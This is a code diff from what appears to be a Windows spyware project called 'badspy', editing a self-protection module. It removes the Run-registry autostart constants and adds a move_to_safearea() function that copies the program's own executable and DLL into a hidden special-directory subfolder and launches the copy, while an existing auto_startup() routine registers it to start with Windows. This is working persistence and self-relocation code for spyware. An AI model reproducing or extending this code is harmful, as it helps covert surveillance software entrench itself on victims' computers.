@@ -1,8 +1,8 @@
 #include "selfprt.h"
 #include "reg.h"
-
-#define SPY_SHD_AUTOBOOT_HKEY		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
-#define SPY_SHD_AUTOBOOT_APPNAME	"badspy"
+#include "../proc.h"
+#include "../fso.h"
+#include <Shlobj.h>
 
 void SelfPrt::auto_startup()
 {
@@ -30,4 +30,51 @@ void SelfPrt::auto_startup()
 			delete reg;
 	}
 	delete[] file_path;
+}
+
+bool SelfPrt::move_to_safearea()
+{
+	char * appdata = new char[MAX_PATH];
+	bool moved = false;
+	if (FSO::get_special_dir(SPY_SHD_SAFEAREA_DIR, appdata))
+	{
+		char * dst_dir_path = new char[MAX_PATH];
+		FSO::path_combine(dst_dir_path, appdata, SPY_SHD_SAFEAREA_SUBDIR);
+		char * dst_file = new char[MAX_PATH];
+		FSO::path_combine(dst_file, dst_dir_path, SPY_SHD_SAFEAREA_DST_EXENAME);
+		if (!FSO::file_exists(dst_file))
+		{
+			int ret = FSO::make_dir(dst_dir_path);
+			if (ret != ERROR_SUCCESS && ret != ERROR_ALREADY_EXISTS && ret != ERROR_FILE_EXISTS)
+			{
+				LOG_E("Make directory is failed: %d", ret);
+			}
+			else
+			{
+				char * src_dir_path = new char[MAX_PATH];
+				FSO::get_dir_path(src_dir_path);
+
+				char * src_file = new char[MAX_PATH];
+
+				FSO::path_combine(dst_file, dst_dir_path, SPY_SHD_SAFEAREA_DST_DLLNAME);
+				FSO::path_combine(src_file, src_dir_path, SPY_SHD_SAFEAREA_SRC_DLLNAME);
+				FSO::copy_file(src_file, dst_file);
+
+				FSO::path_combine(dst_file, dst_dir_path, SPY_SHD_SAFEAREA_DST_EXENAME);
+				FSO::path_combine(src_file, src_dir_path, SPY_SHD_SAFEAREA_SRC_EXENAME);
+				FSO::copy_file(src_file, dst_file);
+
+				FSO::_run(dst_file);
+
+				delete[] src_file;
+				delete[] src_dir_path;
+
+				moved = true;
+			}
+		}
+		delete[] dst_file;
+		delete[] dst_dir_path;
+	}
+	delete[] appdata;
+	return moved;
 }
